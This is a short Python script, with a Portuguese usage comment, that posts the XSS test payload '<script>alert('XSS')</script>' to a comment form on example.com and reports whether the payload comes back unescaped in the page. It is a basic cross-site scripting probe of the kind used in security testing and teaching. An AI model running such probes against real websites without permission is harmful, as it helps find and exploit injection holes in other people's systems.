import requests

def xss_attack(payload):
    url = "https://example.com/comment"
    data = {"comment": payload}
    response = requests.post(url, data=data)
    return payload in response.text

# Exemplo de uso:
xss_payload = "<script>alert('XSS')</script>"
if xss_attack(xss_payload):
    print("XSS Attack successful!")
else:
    print("No XSS vulnerability detected.")
